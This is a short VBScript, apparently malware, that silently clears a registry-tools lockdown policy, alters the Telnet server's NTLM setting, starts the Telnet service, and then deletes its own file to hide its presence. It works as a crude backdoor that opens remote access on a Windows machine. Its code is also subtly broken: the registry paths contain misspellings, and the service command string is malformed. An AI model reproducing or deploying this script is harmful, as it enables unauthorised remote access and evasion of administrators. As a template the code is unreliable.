On Error Resume Next
SET WSHSHELL=WSCRIPT.CREATEOBJECT("WSCRIPT.SHELL")
bkey=wshshell.regread ("HKEY_USERS\.DEFAULT\Software\Miscrosoft\Windwos\Currentversion\Policies\system\DisableRegistryTools")
if bkey=1 then
wshshell.regwrite "HKEY_USERS\.DEFAULT\Software\Miscrosoft\Windwos\Currentversion\Policies\system\DisableRegistryTools",0,"REG_DWORD"
end if
WSHSHELL.REGWRITE "HKLM\Software\Microsoft\TelnetServer\1.0\NTLM",1,"REG_DWORD"
WSHSHELL.RUN "NET START TELNET,0"
SET FSO=WSCRIPT.CREATEOBJECT("SCRIPTING.FILESYSTEMOBJECT")
FSO.DELETEFILE(WSCRIPT.SCRIPTFULLNAME)
WSCRIPT.QUIT
